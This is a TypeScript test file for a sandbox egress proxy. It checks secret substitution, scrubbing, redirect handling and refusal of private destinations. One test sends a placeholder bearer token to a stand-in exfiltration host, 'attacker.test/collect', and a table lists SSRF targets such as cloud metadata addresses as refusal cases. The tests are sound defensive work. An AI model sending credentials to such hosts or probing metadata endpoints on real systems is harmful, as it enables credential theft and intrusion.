// Egress interception: the secret reaches the upstream and nothing the
// container can read ever carries it, and the one RPC this path depends on is
// actually reachable.
//
// The reachability test is derived from the SOURCE of the handler rather than a
// hardcoded name, because five cross-DO calls a head makes on its root spent an
// unknown period rejecting fail-closed inside `console.warn`-only background
// work, invisible to a passing suite. A method missing from the surface is not
// a compile error and not a test failure; it is a silent no-op.
import { describe, expect, test } from 'bun:test';
import { readFileSync } from 'node:fs';
import { createRequire } from 'node:module';
import * as v from 'valibot';
import {
  EGRESS_PLACEHOLDER_PREFIX, refusedHostname, type EgressSecretBinding,
} from '@kinu.run/core';
import type { KinuSandbox } from '../src/kinu-sandbox';
// Static: neither module reaches `cloudflare:email`, so neither needs the mock
// below. That `sandbox-exec-lane` can be imported here without one is the point
// of it living outside `runtime.ts`.
import { kinuEgressParams } from '../src/egress/configure';
import { adaptCloudflareSandbox } from '../src/sandbox-exec-lane';
import type { EgressInjectionResult } from '../src/user/egress-vault';
import type { OutboundHandlerContext } from '@cloudflare/containers';
import type { KinuEgressParams } from '../src/egress/outbound';
import { mockAgentsSdk } from './helpers/agents-sdk';
import { jsrpcStub } from './helpers/jsrpc-stub';
import {
  createRecordingLogger, setDiagnosticsSink, type RecordedLog,
} from '@kinu.run/core/obs';
import { KINU_USER_AGENT, kinuUserAgent, reoriginateRequest } from '../src/lib/http';
// The gate's own resolver of the shipped SDK copy, loaded rather than repeated:
// `bun run gate:egress-interception` and this test must read one copy, and two
// copies of Containers are installed at two versions. `require` and not `import`
// because the gate's module chain reaches `scripts/sources.ts`, whose `.ts`
// import paths need `allowImportingTsExtensions`, which this package does not
// set; a static import puts three TS5097 errors in this package's typecheck.
// Narrowed at the boundary, the way cli-backend loads the pc-agent daemon.
const egressGate = v.parse(
  v.object({ boundContainers: v.function() }),
  createRequire(import.meta.url)('../../../scripts/egress-interception'),
);

/** What the gate's resolver answers: the Containers module the deployed artifact
 *  binds, and the version of the copy it belongs to. */
const BoundContainers = v.object({ module: v.string(), version: v.string() });

// `outbound.ts` imports `getAgentByName` from `agents`, whose module graph
// reaches `cloudflare:email`. One shared mock, then dynamic imports — the same
// ordering every cf-backend DO test uses. The type import above is erased, so
// it loads nothing.
mockAgentsSdk();

const { ORCHESTRATOR_RPC_SURFACE } = await import('../src/rpc-surface');
const {
  CONTAINER_EVENT_HOST, CONTAINER_EVENT_PATH,
  handleContainerEgress, handleContainerEvent, parseEgressParams,
} = await import('../src/egress/outbound');

const root = new URL('../', import.meta.url).pathname;

/** The handler context the SDK passes: `containerId` and `className` are
 *  platform-supplied, `params` is whatever the owning DO configured. */
function ctx(params: OutboundHandlerContext['params']): OutboundHandlerContext {
  return { containerId: 'container-1', className: 'KinuSandbox', params };
}
const read = (path: string): string => readFileSync(`${root}${path}`, 'utf8');

const SECRET = ['sk_live_', 'abcdefghij0123456789'].join('');
const PLACEHOLDER = `${EGRESS_PLACEHOLDER_PREFIX}${'Q'.repeat(43)}`;
const BINDING: EgressSecretBinding = {
  id: 'stripe', label: 'Stripe', host: 'api.stripe.com', placeholder: PLACEHOLDER,
};
const PARAMS: KinuEgressParams = {
  workspaceName: 'kinu-main', ownerUserId: 'user-1', bindings: [BINDING],
};

/** An `Env` whose UserDO answers the one vault call, and nothing else.
 *
 *  `get` returns a `jsrpcStub`, not an object literal: the real binding returns a
 *  Proxy whose methods are not own enumerable properties, and a literal double
 *  hid a production TypeError in this exact handler behind a passing test. */
function fakeEnv(resolve: () => EgressInjectionResult): Env {
  const view: Partial<Env> = {};
  Object.assign(view, {
    UserDO: {
      idFromName: (name: string) => name,
      get: () => jsrpcStub({ resolveEgressInjection: async () => resolve() }),
    },
    CREDENTIAL_ENCRYPTION_KEY: 'a-test-credential-encryption-key-0123456789',
  });
  // SAFETY: every member the handler reads is constructed by the Object.assign
  // above — `UserDO.idFromName`, `UserDO.get` and `CREDENTIAL_ENCRYPTION_KEY` are
  // the complete set `handleContainerEgress` touches, which its body declares
  // directly, so no unassigned binding is reachable at runtime.
  return view as Env;
}

interface FetchCapture {
  readonly seen: Request[];
  readonly restore: () => void;
}

/** Capture what actually left toward the upstream. */
function captureFetch(response: () => Response): FetchCapture {
  const seen: Request[] = [];
  const original = globalThis.fetch;
  const stub: typeof globalThis.fetch = Object.assign(
    async (input: Parameters<typeof globalThis.fetch>[0], init?: Parameters<typeof globalThis.fetch>[1]) => {
      const request = input instanceof Request ? input : new Request(String(input), init);
      seen.push(request);
      return response();
    },
    { preconnect: original.preconnect },
  );
  globalThis.fetch = stub;
  return { seen, restore: () => { globalThis.fetch = original; } };
}

/** A box whose only exercised members are the readiness gate and one operation.
 *  Unchecked and named: `KinuSandbox` is a Durable Object class, so a test
 *  cannot construct one; the double rides the prototype the way
 *  helpers/jsrpc-stub.ts builds stubs, and implements exactly what the
 *  adapter's preflight reaches. */
function execOnlyBox(): KinuSandbox {
  return Object.create({
    ensureReady: async () => {},
    startProcess: async () => ({
      id: 'p1',
      exitCode: 0,
      waitForExit: async () => ({ exitCode: 0 }),
      getStatus: async () => 'exited',
    }),
    getProcessLogs: async () => ({ stdout: 'done', stderr: '' }),
  });
}

describe('the secret reaches the upstream and comes back scrubbed', () => {
  test('the placeholder becomes the secret on the wire to the bound host', async () => {
    const upstream = captureFetch(() => new Response('ok'));
    try {
      const response = await handleContainerEgress(
        new Request('https://api.stripe.com/v1/charges', {
          method: 'POST', headers: { authorization: `Bearer ${PLACEHOLDER}` },
        }),
        fakeEnv(() => ({ kind: 'forward', substitutions: [{ placeholder: PLACEHOLDER, secret: SECRET }] })),
        PARAMS,
      );
      expect(response.status).toBe(200);
      expect(upstream.seen).toHaveLength(1);
      expect(upstream.seen[0]!.headers.get('authorization')).toBe(`Bearer ${SECRET}`);
      // Redirects must not be followed: the default would replay the injected
      // credential against whatever host the upstream names.
      expect(upstream.seen[0]!.redirect).toBe('manual');
    } finally { upstream.restore(); }
  });

  test('an echoed secret is scrubbed out of the body, headers and status text', async () => {
    const upstream = captureFetch(() => new Response(
      `invalid api key: ${SECRET}`,
      {
        status: 401,
        statusText: `rejected ${SECRET}`,
        headers: { 'www-authenticate': `Bearer error="${SECRET}"`, location: `/retry?k=${SECRET}` },
      },
    ));
    try {
      const response = await handleContainerEgress(
        new Request('https://api.stripe.com/v1/charges', { headers: { authorization: `Bearer ${PLACEHOLDER}` } }),
        fakeEnv(() => ({ kind: 'forward', substitutions: [{ placeholder: PLACEHOLDER, secret: SECRET }] })),
        PARAMS,
      );
      const body = await response.text();
      expect(body).not.toContain(SECRET);
      expect(body).toContain(PLACEHOLDER);
      expect(response.headers.get('www-authenticate')).not.toContain(SECRET);
      expect(response.headers.get('location')).not.toContain(SECRET);
      expect(response.statusText).not.toContain(SECRET);
    } finally { upstream.restore(); }
  });

  test('a refusal names no secret', async () => {
    const response = await handleContainerEgress(
      new Request('https://attacker.test/collect', { headers: { authorization: `Bearer ${PLACEHOLDER}` } }),
      fakeEnv(() => ({ kind: 'refuse', status: 403, reason: 'bound to api.stripe.com' })),
      PARAMS,
    );
    expect(response.status).toBe(403);
    expect(await response.text()).not.toContain(SECRET);
  });

  test('an unconfigured container is refused, never forwarded', async () => {
    const upstream = captureFetch(() => new Response('should not happen'));
    try {
      const response = await handleContainerEgress(
        new Request('https://api.stripe.com/'), fakeEnv(() => ({ kind: 'forward', substitutions: [] })), undefined,
      );
      expect(response.status).toBe(503);
      expect(upstream.seen).toHaveLength(0);
    } finally { upstream.restore(); }
  });

  test('traffic with no placeholder is forwarded untouched', async () => {
    const upstream = captureFetch(() => new Response('ok'));
    try {
      await handleContainerEgress(
        new Request('https://example.com/'),
        fakeEnv(() => ({ kind: 'forward', substitutions: [] })),
        PARAMS,
      );
      expect(upstream.seen[0]!.url).toBe('https://example.com/');
      expect(upstream.seen[0]!.headers.get('authorization')).toBeNull();
    } finally { upstream.restore(); }
  });
});

describe('what the container is configured with', () => {
  test('only GRANTED bindings are passed, so an ungranted placeholder is never learned', () => {
    const params = kinuEgressParams({
      workspaceName: 'kinu-main',
      ownerUserId: 'user-1',
      vault: [BINDING, { id: 'prod-db', label: 'Prod DB', host: 'db.internal', placeholder: `${EGRESS_PLACEHOLDER_PREFIX}${'Z'.repeat(43)}` }],
      grants: [{ rule: 'egress-secret:stripe', executor: 'sandbox' }],
    });
    expect(params.bindings.map((b) => b.id)).toEqual(['stripe']);
    expect(JSON.stringify(params)).not.toContain('prod-db');
  });

  test('a grant on another executor does not widen the container', () => {
    const params = kinuEgressParams({
      workspaceName: 'w', ownerUserId: 'u', vault: [BINDING],
      grants: [{ rule: 'egress-secret:stripe', executor: 'laptop' }],
    });
    expect(params.bindings).toEqual([]);
  });

  test('the event host is bound BEFORE the catch-all, by the object that owns the container',
    () => {
      // Per-host handlers take precedence over the catch-all, so binding the
      // catch-all first would leave a window in which a container event went to
      // the egress handler, found no placeholder in it, and was forwarded to a
      // `.internal` name that resolves nowhere. Read from the source of the one
      // writer: this ordering used to exist in TWO places, and the one the live
      // path actually called was the one that did not pin the workspace name.
      const sandbox = read('src/kinu-sandbox.ts');
      const body = sandbox.slice(sandbox.indexOf('async configureEgress('));
      expect(body.indexOf('setOutboundByHost')).toBeLessThan(body.indexOf('setOutboundHandler'));
      // And the name is pinned in the same call, because both host hooks read it.
      expect(body.indexOf('WORKSPACE_NAME_KEY')).toBeLessThan(body.indexOf('setOutboundByHost'));
    });

  test('params are parsed, so a malformed configuration reads as unconfigured', () => {
    expect(parseEgressParams(ctx(PARAMS))).toEqual(PARAMS);
    expect(parseEgressParams(ctx({ workspaceName: 'w' }))).toBeUndefined();
    expect(parseEgressParams(ctx(undefined))).toBeUndefined();
  });
});

describe('configuration is awaited before the container runs', () => {
  test('the first operation configures once, and concurrent callers share it', async () => {
    let configured = 0;
    let released: () => void = () => {};
    const gate = new Promise<void>((resolve) => { released = resolve; });
    // `null`: an exec-only box publishes no previews, and the lane refuses to
    // mint one it cannot publish — see `adaptCloudflareSandbox`'s exposePort.
    const handle = adaptCloudflareSandbox(
      execOnlyBox(),
      async () => { configured += 1; await gate; },
      null,
    );
    const both = Promise.all([handle.exec('a'), handle.exec('b')]);
    released();
    expect((await both).map((r) => r.stdout)).toEqual(['done', 'done']);
    expect(configured).toBe(1);
  });

  test('a failed configuration is not cached, so the next call retries', async () => {
    let attempts = 0;
    const handle = adaptCloudflareSandbox(
      execOnlyBox(),
      async () => { attempts += 1; if (attempts === 1) throw new Error('root unreachable'); },
      null,
    );
    await expect(handle.exec('a')).rejects.toThrow('root unreachable');
    expect((await handle.exec('a')).stdout).toBe('done');
    expect(attempts).toBe(2);
  });

  test('EVERY operation that can start the container waits for it — including the file lanes',
    async () => {
      // The old wrapper carried a hand-maintained allowlist that the file lanes
      // were never added to, so a cold `readFile` started the container itself
      // and read a blank disk, and a `writeFile` landed under the overlay a
      // moment later — written by the caller, invisible to the caller and to
      // every checkpoint after it.
      const order: string[] = [];
      const box: KinuSandbox = Object.create({
        ensureReady: async () => { order.push('ensureReady'); },
        readFile: async () => { order.push('readFile'); return { content: '' }; },
        writeFile: async () => { order.push('writeFile'); return undefined; },
        listFiles: async () => { order.push('listFiles'); return { files: [] }; },
        deleteFile: async () => { order.push('deleteFile'); return undefined; },
      });
      const handle = adaptCloudflareSandbox(box, async () => { order.push('configureEgress'); }, null);

      await handle.readFile('/workspace/a');
      await handle.writeFile('/workspace/a', 'x');
      await handle.listFiles('/workspace');
      await handle.deleteFile('/workspace/a');

      // Egress once, then readiness before each operation, never after.
      expect(order).toEqual([
        'configureEgress', 'ensureReady', 'readFile',
        'ensureReady', 'writeFile',
        'ensureReady', 'listFiles',
        'ensureReady', 'deleteFile',
      ]);
    });
});

describe('reachability of the container event channel', () => {
  // Derived from the handler's own source, not restated: the point is that
  // adding a call here without allowlisting it must fail.
  test('every OrchestratorAgent method the egress layer calls is on the RPC surface', () => {
    const handler = read('src/egress/outbound.ts');
    const called = [...handler.matchAll(/\bagent\.(\w+)\(/g)].map(([, name]) => name!);
    expect(called.length).toBeGreaterThan(0);
    expect([...new Set(called)].filter((name) => !ORCHESTRATOR_RPC_SURFACE.includes(name))).toEqual([]);
  });

  test('the method the channel calls actually exists on the orchestrator', () => {
    expect(read('src/orchestrator.ts')).toContain('async acceptContainerEvent(');
  });

  test('the event channel has exactly one route, on a name that resolves nowhere public', () => {
    expect(CONTAINER_EVENT_HOST.endsWith('.internal')).toBe(true);
    expect(CONTAINER_EVENT_PATH.startsWith('/')).toBe(true);
  });
});

describe('the posture the whole design rests on', () => {
  test('ContainerProxy is exported from the Worker entry', () => {
    // Without it `applyOutboundInterception` throws and NOTHING is intercepted,
    // while the vault still believes it is substituting.
    expect(read('src/server.ts')).toMatch(/export\s*\{[^}]*\bContainerProxy\b[^}]*\}/);
  });

  test('the container class denies non-HTTP egress and intercepts HTTPS', () => {
    const source = read('src/kinu-sandbox.ts');
    expect(source).toContain('enableInternet = false');
    // The SDK does NOT default this on, whatever its docs say.
    expect(source).toContain('interceptHttps = true');
  });

  test('the SDK still leaves HTTPS interception off by default', () => {
    // Re-measured so the comments asserting it cannot quietly rot. If upstream
    // fixes the default this fails and the comments get updated. The copy read is
    // the one the artifact binds, resolved by the gate rather than named here.
    const shipped = v.parse(BoundContainers, egressGate.boundContainers());
    expect(readFileSync(shipped.module, 'utf8')).toContain('interceptHttps = false');
  });
});

// A JSRPC stub is a Proxy: its methods come from a `get` trap, so they are not
// own enumerable properties and `Object.assign`/spread copy NOTHING off it.
//
// Three sites did that and were measured throwing on production
// (`resolveEgressInjection`, `listEgressSecrets`, `acceptContainerEvent`); the
// fourth, `runtime.ts`'s `rootView`, is the same pattern and was never observed
// firing.
//
// A source-level detector used to live here, scoped to two files by regex. The
// `anti-slop/no-copy-rpc-stub` oxlint rule replaced it: same defect, matched on
// the AST across the whole repo and gated by `bun run lint`. What stays here is
// the one thing a linter cannot assert — that the double these tests run
// against really does behave like a stub.
describe('a stub is used, never copied', () => {
  test('the double is faithful in the way that matters: copying it loses everything', () => {
    // The premise, asserted rather than described. If a future runtime made
    // spreading a stub work, this fails and the doubles above stop being
    // evidence about production.
    const stub = jsrpcStub({ method: () => 'value' });
    expect(Object.keys({ ...stub })).toEqual([]);
    // ...while the stub itself answers, so the double is not merely broken.
    expect(stub.method()).toBe('value');
  });
});

/** Capture what the diagnostic sink was told while `body` ran. */
async function recordDiagnostics(body: () => Promise<void>): Promise<readonly RecordedLog[]> {
  const logger = createRecordingLogger();
  const restore = setDiagnosticsSink(logger);
  try { await body(); } finally { restore(); }
  return logger.emitted;
}

/** An `Env` whose vault call throws, the way a Durable Object under load or
 *  mid-eviction answers a cross-object RPC. */
function throwingVaultEnv(thrown: { cause: unknown }): Env {
  const view: Partial<Env> = {};
  Object.assign(view, {
    UserDO: {
      idFromName: (name: string) => name,
      get: () => jsrpcStub({ resolveEgressInjection: async () => { throw thrown.cause; } }),
    },
    CREDENTIAL_ENCRYPTION_KEY: 'a-test-credential-encryption-key-0123456789',
  });
  /* SAFETY: as `fakeEnv` above — `UserDO.idFromName`, `UserDO.get` and
     `CREDENTIAL_ENCRYPTION_KEY` are the complete set the handler reads, and
     every one of them is constructed by the Object.assign above. */
  return view as Env;
}

/** An `Env` whose workspace object refuses the event RPC. `getAgentByName` is
 *  mocked to `namespace.get(namespace.idFromName(name))`, so the namespace
 *  double is the whole seam. */
function throwingEventEnv(thrown: { cause: unknown }): Env {
  const view: Partial<Env> = {};
  Object.assign(view, {
    OrchestratorAgent: {
      idFromName: (name: string) => name,
      get: () => jsrpcStub({ acceptContainerEvent: async () => { throw thrown.cause; } }),
    },
  });
  /* SAFETY: `OrchestratorAgent.idFromName` and `.get` are the complete set
     `handleContainerEvent` reaches before the RPC it is here to fail, and both
     are constructed by the Object.assign above. */
  return view as Env;
}

// KINU-055. Every request leaving a container says Kinu, and says it FIRST.
// Before this, whatever the agent's HTTP client called itself was the only
// identity an upstream ever saw, so a rate limit or a block aimed at Kinu
// could not be aimed at all.
describe('one User-Agent for everything a container sends', () => {
  test('traffic with no placeholder carries the Kinu identity', async () => {
    const upstream = captureFetch(() => new Response('ok'));
    try {
      await handleContainerEgress(
        new Request('https://example.com/', { headers: { 'user-agent': 'curl/8.5.0' } }),
        fakeEnv(() => ({ kind: 'forward', substitutions: [] })),
        PARAMS,
      );
      expect(upstream.seen[0]!.headers.get('user-agent')).toBe(`${KINU_USER_AGENT} curl/8.5.0`);
    } finally { upstream.restore(); }
  });

  test('the secret-bearing path carries the same identity — one policy, not two', async () => {
    const upstream = captureFetch(() => new Response('ok'));
    try {
      await handleContainerEgress(
        new Request('https://api.stripe.com/v1/charges', {
          method: 'POST', headers: { authorization: `Bearer ${PLACEHOLDER}`, 'user-agent': 'curl/8.5.0' },
        }),
        fakeEnv(() => ({ kind: 'forward', substitutions: [{ placeholder: PLACEHOLDER, secret: SECRET }] })),
        PARAMS,
      );
      expect(upstream.seen[0]!.headers.get('user-agent')).toBe(`${KINU_USER_AGENT} curl/8.5.0`);
    } finally { upstream.restore(); }
  });

  test('a container that sends no User-Agent still identifies as Kinu', async () => {
    const upstream = captureFetch(() => new Response('ok'));
    try {
      await handleContainerEgress(
        new Request('https://example.com/'),
        fakeEnv(() => ({ kind: 'forward', substitutions: [] })),
        PARAMS,
      );
      expect(upstream.seen[0]!.headers.get('user-agent')).toBe(KINU_USER_AGENT);
    } finally { upstream.restore(); }
  });

  test('the caller keeps its own tokens, behind ours, and cannot displace them', () => {
    expect(kinuUserAgent('python-requests/2.32')).toBe(`${KINU_USER_AGENT} python-requests/2.32`);
    expect(kinuUserAgent(null)).toBe(KINU_USER_AGENT);
    expect(kinuUserAgent('   ')).toBe(KINU_USER_AGENT);
    // A field value with a control character is not one. Dropped whole rather
    // than repaired: a repaired identity is a different identity.
    expect(kinuUserAgent('evil\u0000agent')).toBe(KINU_USER_AGENT);
    // A second interception hop must not stack the token again.
    expect(kinuUserAgent(`${KINU_USER_AGENT} curl/8.5.0`)).toBe(`${KINU_USER_AGENT} curl/8.5.0`);
  });
});

// KINU-017 at this boundary. The workerd layer measures the wire
// (`tests/workerd/egress-framing.test.ts`); what belongs here is that the
// handler hands the runtime the body it was given, since that is the only
// thing the runtime derives the framing from.
describe('the forwarded body is the container\'s own, not a copy of it', () => {
  test('the request that leaves carries the inbound body object itself', async () => {
    const upstream = captureFetch(() => new Response('ok'));
    try {
      // `duplex` is absent from the Workers `RequestInit` type and required by
      // the fetch specification for a stream body — the same intersection
      // `reoriginateRequest` declares, so the test states the type instead of
      // asserting past it.
      const init: RequestInit & { duplex: 'half' } = {
        method: 'POST',
        body: new ReadableStream<Uint8Array>({
          start(controller) { controller.enqueue(new Uint8Array([1, 2, 3])); controller.close(); },
        }),
        duplex: 'half',
      };
      const inbound = new Request('https://example.com/upload', init);
      const body = inbound.body;
      await handleContainerEgress(
        inbound, fakeEnv(() => ({ kind: 'forward', substitutions: [] })), PARAMS,
      );
      expect(upstream.seen[0]!.body).toBe(body);
    } finally { upstream.restore(); }
  });

  test('a bodyless request re-originates without one', () => {
    const rebuilt = reoriginateRequest(
      new Request('https://example.com/thing'),
      'https://example.com/thing',
      { headers: new Headers(), redirect: 'follow' },
    );
    expect(rebuilt.body).toBeNull();
  });
});

// KINU-037. An outbound handler that THROWS returns no HTTP response at all,
// so the container's client prints "Empty reply from server" and nothing says
// whether the request was refused, delivered, or never attempted. Both halves
// of this boundary now answer.
describe('a throw at the boundary becomes a classified answer', () => {
  test('an unreachable vault answers 503 and names the class, not the request', async () => {
    let response: Response | undefined;
    const emitted = await recordDiagnostics(async () => {
      response = await handleContainerEgress(
        new Request('https://api.stripe.com/v1/charges', { headers: { authorization: `Bearer ${PLACEHOLDER}` } }),
        throwingVaultEnv({ cause: new Error('durable object reset') }),
        PARAMS,
      );
    });
    expect(response?.status).toBe(503);
    const body = await response!.text();
    expect(body).toContain('unavailable');
    expect(body).toContain('api.stripe.com');

    expect(emitted).toHaveLength(1);
    expect(emitted[0]!.event).toBe('egress.authority_unreachable');
    expect(emitted[0]!.code).toBe('unavailable');
    // The chain is retained, both what we were doing and what threw.
    expect(emitted[0]!.cause).toContain('asking the owner vault');
    expect(emitted[0]!.cause).toContain('durable object reset');
  });

  test('a deadline on the vault is 504, not 503 — the two imply different retries', async () => {
    const timeout = new DOMException('The operation timed out', 'TimeoutError');
    const response = await handleContainerEgress(
      new Request('https://api.stripe.com/'), throwingVaultEnv({ cause: timeout }), PARAMS,
    );
    expect(response.status).toBe(504);
  });

  test('an upstream that cannot be reached answers 502 with the failure class', async () => {
    const upstream = captureFetch(() => { throw new Error('connection refused'); });
    let response: Response | undefined;
    try {
      const emitted = await recordDiagnostics(async () => {
        response = await handleContainerEgress(
          new Request('https://example.com/'),
          fakeEnv(() => ({ kind: 'forward', substitutions: [] })),
          PARAMS,
        );
      });
      expect(response?.status).toBe(502);
      expect(await response!.text()).toContain('example.com');
      expect(emitted).toHaveLength(1);
      expect(emitted[0]!.event).toBe('egress.upstream_failed');
      expect(emitted[0]!.cause).toContain('connection refused');
    } finally { upstream.restore(); }
  });

  test('an upstream failure quoting the substituted URL never records the secret', async () => {
    // workerd's own fetch failure reads `Fetch API cannot load: <url>`, and by
    // then the URL is the REVEALED one. Wrapping that error would have put the
    // owner's credential in Workers Logs on every DNS failure.
    const upstream = captureFetch(() => {
      throw new Error(`Fetch API cannot load: https://api.stripe.com/v1/charges?key=${SECRET}`);
    });
    let response: Response | undefined;
    try {
      const emitted = await recordDiagnostics(async () => {
        response = await handleContainerEgress(
          new Request('https://api.stripe.com/v1/charges', { headers: { authorization: `Bearer ${PLACEHOLDER}` } }),
          fakeEnv(() => ({ kind: 'forward', substitutions: [{ placeholder: PLACEHOLDER, secret: SECRET }] })),
          PARAMS,
        );
      });
      expect(response?.status).toBe(502);
      expect(await response!.text()).not.toContain(SECRET);
      expect(emitted[0]!.cause).not.toContain(SECRET);
      // Scrubbed, not deleted: the placeholder the container already holds is
      // what an operator correlates the failure with.
      expect(emitted[0]!.cause).toContain(PLACEHOLDER);
    } finally { upstream.restore(); }
  });

  test('the event channel answers when its workspace object refuses the RPC', async () => {
    let response: Response | undefined;
    const emitted = await recordDiagnostics(async () => {
      response = await handleContainerEvent(
        new Request(`https://${CONTAINER_EVENT_HOST}${CONTAINER_EVENT_PATH}`, {
          method: 'POST', body: JSON.stringify({ kind: 'note' }),
        }),
        throwingEventEnv({ cause: new Error('object evicted mid-write') }),
        PARAMS,
      );
    });
    expect(response?.status).toBe(503);
    // The container has to know the event is NOT recorded, or it drops it.
    expect(await response!.text()).toContain('send it again');
    expect(emitted[0]!.event).toBe('egress.event_channel_unreachable');
    expect(emitted[0]!.cause).toContain('object evicted mid-write');
  });
});

// KINU-086 at the CF boundary. The JUDGMENT lives in core
// (`safety/egress-destination.ts`, judged in core's own suite); what belongs
// here is the ENFORCEMENT this adapter owns: the handler refuses private
// destinations before the vault call, the refusal is the classified payload on
// the wire, and every redirect hop is handed back so it re-enters the handler
// and is judged like the first.
describe('private destinations are refused at the one place requests leave', () => {
  test.each([
    ['RFC1918 10/8', 'http://10.0.0.5/'],
    ['RFC1918 172.16/12', 'http://172.16.0.1/'],
    ['RFC1918 192.168/16', 'http://192.168.1.1/'],
    ['loopback 127/8', 'http://127.0.0.1/'],
    ['CGNAT 100.64/10', 'http://100.64.0.1/'],
    ['this-network 0.0.0.0/8', 'http://0.0.0.0/'],
    ['metadata address', 'http://169.254.169.254/latest/meta-data/'],
    ['link-local 169.254/16', 'http://169.254.0.1/'],
    ['reserved name localhost', 'http://localhost:8080/'],
    ['reserved domain .localhost', 'http://api.service.localhost/'],
    ['reserved metadata names', 'http://metadata.google.internal/computeMetadata/v1/'],
    ['IPv6 loopback', 'http://[::1]/'],
    ['IPv6 link-local', 'http://[fe80::1]/'],
    ['IPv6 ULA', 'http://[fd00::119:1]/'],
    ['IPv6 mapped private', 'http://[::ffff:169.254.169.254]/'],
  ])('%s is refused before the vault is asked', async (_label, target) => {
    const upstream = captureFetch(() => new Response('should not happen'));
    try {
      const refusal = await handleContainerEgress(
        new Request(target), fakeEnv(() => ({ kind: 'forward', substitutions: [] })), PARAMS,
      );
      expect(refusal.status).toBe(403);
      // The classified payload, on the wire in the shared shape.
      expect(await refusal.json()).toMatchObject({ reason: 'denied' });
      // The refused destination is never contacted, and its body never read.
      expect(upstream.seen).toHaveLength(0);
    } finally { upstream.restore(); }
  });

  test('the refusal is recorded with the classification and host only', async () => {
    const emitted = await recordDiagnostics(async () => {
      await handleContainerEgress(
        new Request('http://169.254.169.254/latest/meta-data/'),
        fakeEnv(() => ({ kind: 'forward', substitutions: [] })), PARAMS,
      );
    });
    expect(emitted[0]!.event).toBe('egress.private_destination');
    expect(emitted[0]!.code).toBe('denied');
    // Host only — no path, no query in the diagnostic.
    expect(emitted[0]!.fields).toEqual({ host: '169.254.169.254' });
  });

  test('the public control still succeeds end to end', async () => {
    const upstream = captureFetch(() => new Response('ok'));
    try {
      const response = await handleContainerEgress(
        new Request('https://example.com/'),
        fakeEnv(() => ({ kind: 'forward', substitutions: [] })), PARAMS,
      );
      expect(response.status).toBe(200);
      expect(upstream.seen).toHaveLength(1);
    } finally { upstream.restore(); }
  });

  test('the classifier shares one judgment with core, at the CF boundary', () => {
    // The handler refuses through the SAME function core's suite judges, so
    // this boundary assertion pins the adapter seam, not a second copy.
    expect(refusedHostname('[fe80::1]')).toMatchObject({ reason: 'denied' });
    expect(refusedHostname('2606:4700:4700::1111')).toBeNull();
  });
});

describe('every redirect hop is judged, not trusted', () => {
  test('the runtime never follows: the 3xx is handed back for re-judgment', async () => {
    const hop = captureFetch(() => new Response(null, {
      status: 302, headers: { location: 'http://169.254.169.254/latest/meta-data/' },
    }));
    try {
      const first = await handleContainerEgress(
        new Request('https://public.example/start'),
        fakeEnv(() => ({ kind: 'forward', substitutions: [] })), PARAMS,
      );
      expect(first.status).toBe(302);
      // The request left with redirect manual, so the hop's next request is
      // the CONTAINER's, and it re-enters the handler.
      expect(hop.seen[0]!.redirect).toBe('manual');
    } finally { hop.restore(); }
  });

  test('the redirected request re-enters the handler and is refused at the hop', async () => {
    // Hop 1 passes (public), hands the 3xx back; hop 2 is the container's
    // request to the private Location, and the guard refuses it before the
    // vault call — the refused destination is never contacted.
    const refused = captureFetch(() => new Response('should not happen'));
    try {
      const second = await handleContainerEgress(
        new Request('http://169.254.169.254/latest/meta-data/'),
        fakeEnv(() => ({ kind: 'forward', substitutions: [] })), PARAMS,
      );
      expect(second.status).toBe(403);
      expect(await second.json()).toMatchObject({ reason: 'denied' });
      expect(refused.seen).toHaveLength(0);
    } finally { refused.restore(); }
  });
});
